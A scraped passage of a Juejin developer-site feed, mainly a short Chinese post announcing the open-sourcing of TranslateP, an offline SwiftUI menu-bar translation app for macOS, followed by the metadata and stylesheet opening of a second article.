                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>从 24 年 11 月 3 日开始到现在过去了整整一年，当初因为突然间欧陆词典的快捷键翻译彻底失效，导致我忍无可忍的自己从头开始写一个翻译软件给自己用。用业余零碎的时间完善了它，达到了我心中最低可用的效果，当初开发时借鉴了一些开源项目的实现，现在是时候也贡献出来了！</p>
</blockquote>
<p>GitHub 开源仓库地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwindstormeye%2FTranslateP" target="_blank" title="https://github.com/windstormeye/TranslateP" ref="nofollow noopener noreferrer">github.com/windstormey…</a></p>
<p>app store 下载链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fapps.apple.com%2Fcn%2Fapp%2Ftranslatep%2Fid6737735627" target="_blank" title="https://apps.apple.com/cn/app/translatep/id6737735627" ref="nofollow noopener noreferrer">apps.apple.com/cn/app/tran…</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b565346ad6b454c8cf6011759a795e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUEpIdWJz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764607094&amp;x-signature=JmbPlEHvYAx%2F2XcjSto9Y5VBo18%3D" alt="1.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab97be6f133e4316b9780fb099efa3e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUEpIdWJz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764607094&amp;x-signature=RlAsIhDClwJH8iH7W%2FFSCw6UT8M%3D" alt="2.png" loading="lazy"/></p>
<p>本来想写的有很多，但实在是没有更多精力了，就简单介绍下吧。</p>
<p>基于 SwiftUI 实现的在 macOS 上可无网络使用的菜单栏 AI 翻译小工具，目前暂时只支持英译中和中译英，可朗读原文也可查看音标，简单的 UI 样式调整都可以，支持双击两次 cmd + c 快捷键翻译。整个 app 的大小只有 1.3 MB，比一张 iPhone 照片还要小！</p>
<p>我自己用了整整一年的时间，没有任何使用压力，不用担心数据泄漏和网络环境问题，甚至还支持截图翻译。底层的技术都是相通的，feature list 里还有好多想做的没有实现，但经过了一年的时间，真正想做的事情早就应该做了，剩下没做的，大概率算不上核心诉求，也就作罢。</p>
<p>开源的主要目的是原计划年底前找到一个可尝试的商业化方法，尝试在 app 中增加一些内购或者收费点。但思来想去好久，始终找不到合适的收费点，在现如今的背景下，再做翻译工具软件已毫无价值，但意义对于每个人都不同，如果你感兴趣的话，可以阅读我的这两篇开发总结博客，可能有一些帮助。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fpjhubs.com%2F2024%2F11%2F03%2Ftranslatep-init%2F" target="_blank" title="https://pjhubs.com/2024/11/03/translatep-init/" ref="nofollow noopener noreferrer"># 《TranslateP 开发日志 01》- 做了一个翻译软件</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fpjhubs.com%2F2025%2F06%2F21%2Ftranslatep-release-1.0.3%2F" target="_blank" title="https://pjhubs.com/2025/06/21/translatep-release-1.0.3/" ref="nofollow noopener noreferrer"># 《TranslateP 开发日志 02》- 最后一块拼图</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[不愧是国内首个视觉编程模型，一张草稿图直接做了一个电子版City Walk]]></title>    <link>https://juejin.cn/post/7576086557716824115</link>    <guid>https://juejin.cn/post/7576086557716824115</guid>    <pubDate>2025-11-24T14:47:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576086557716824115" data-draft-id="7576141849430097947" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="不愧是国内首个视觉编程模型，一张草稿图直接做了一个电子版City Walk"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T14:47:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LucianaiB"/> <meta itemprop="url" content="https://juejin.cn/user/1269294586664749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            不愧是国内首个视觉编程模型，一张草稿图直接做了一个电子版City Walk
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1269294586664749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LucianaiB
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:47:40.000Z" title="Mon Nov 24 2025 14:47:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body 